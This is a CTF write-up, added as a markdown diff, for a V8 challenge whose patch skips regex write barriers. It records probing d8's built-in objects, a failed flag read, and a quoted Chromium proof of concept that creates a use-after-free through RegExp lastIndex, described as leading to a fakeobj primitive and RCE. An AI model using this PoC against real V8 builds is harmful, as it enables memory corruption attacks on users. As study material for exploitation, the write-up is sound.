@@ -1,0 +1,80 @@
+# osu-v8
+
+## initial exploration
+
+Challenge provides a d8 binary, a patch, and tells us that the build was based on commit `8cf17a14a78cc1276eb42e1b4bb699f705675530`.
+```diff path="dist/patch.diff" open
+```
+
+The patch removes some io functions, and changes a flag from `UPDATE_WRITE_BARRIER` to `SKIP_WRITE_BARRIER` in some regex handling code. Patching out the io functions is probably just to stop cheeses, and the actual vulnerability involves the regex code. But I'm lazy so we'll try to cheese the challenge first.
+
+## possible cheese
+
+Running the `d8` binary and executing
+```js open
+d8> Object.keys(this)
+["version", "setTimeout", "quit", "testRunner", "Realm", "performance", "Worker", "os", "d8", "arguments"]
+```
+prints out some interesting looking entries, namely `os` and `d8`
+```js open
+d8> os
+{chdir: function chdir() { [native code] }, setenv: function setenv() { [native code] }, unsetenv: function unsetenv() { [native code] }, umask: function umask() { [native code] }, mkdirp: function mkdirp() { [native code] }, rmdir: function rmdir() { [native code] }, name: "linux", d8Path: "./d8"}
+```
+`os` has some file manipulation functions, but nothing to read files...
+```js open
+d8> d8     
+{file: {read: function read() { [native code] }, execute: function execute() { [native code] }}, log: {getAndStop: function getAndStop() { [native code] }}, dom: {EventTarget: function EventTarget() { [native code] }, Div: function Div() { [native code] }}, test: {verifySourcePositions: function verifySourcePositions() { [native code] }, installConditionalFeatures: function installConditionalFeatures() { [native code] }}, promise: {setHooks: function setHooks() { [native code] }}, debugger: {enable: function enable() { [native code] }, disable: function disable() { [native code] }}, serializer: {serialize: function serialize() { [native code] }, deserialize: function deserialize() { [native code] }}, profiler: {setOnProfileEndListener: function setOnProfileEndListener() { [native code] }, triggerSample: function triggerSample() { [native code] }}, terminate: function terminate() { [native code] }, quit: function quit() { [native code] }}
+```
+but `d8` has a `file.read()` function! Did the challenge authors somehow miss a easy cheese? Surely not...
+
+Testing to see if `file.read()` can leak the flag on remote:
+```text open
+script size:
+48
+script:
+throw new Error(d8.file.read("/home/ctf/flag"))
+/home/ctf/tmp.IJFY3DhIGb.js:1: Error: Error loading file: /home/ctf/flag
+throw new Error(d8.file.read("/home/ctf/flag"))
+                        ^
+Error: Error loading file: /home/ctf/flag
+    at /home/ctf/tmp.IJFY3DhIGb.js:1:25
+```
+didnt work :(. Taking a look at the dockerfile shows that the chall authors make `flag` readonly by root, and give the `getflag` binary root and suid permissions. Looks like we actually need to perform the intended exploit and get rce on remote.
+
+## back on track
+
+A little bit of searching yields [https://issues.chromium.org/issues/40059133](https://issues.chromium.org/issues/40059133), an issue that exploits the exact bug that the patch introduces. The thread includes a poc for uaf on the v8 heap, as well a full exploit.
+
+```js filename="poc.js" open
+var re = new RegExp('foo', 'g');  
+  
+var match_object = {};  
+match_object[0] = {  
+    toString : function() {  
+        return "";  
+    }  
+};  
+  
+re.exec = function() {  
+    gc(); // move `re` to oldspace using a mark-sweep gc  
+    delete re.exec; // transition back to initial regexp map to pass HasInitialRegExpMap  
+    re.lastIndex = 1073741823; // maximum smi, adding one will result in a HeapNumber  
+    RegExp.prototype.exec = function() {  
+        throw ''; // break out of Regexp.replace  
+    }  
+    return match_object;  
+};  
+  
+try {  
+    var newstr = re[Symbol.replace]("fooooo", ".$");  
+} catch(e) {}  
+  
+gc({type:'minor'});  
+gc({type:'minor'});  
+gc({type:'minor'});  
+gc({type:'minor'});  
+gc({type:'minor'});  
+%DebugPrint(re.lastIndex);
+```
+
+The poc shows how to create a dangling reference in `re.lastIndex` to a location on the heap, the contents of which can then be overwritten with new data. This basically gives us a `fakeobj` primitive which can be escalated to rce.
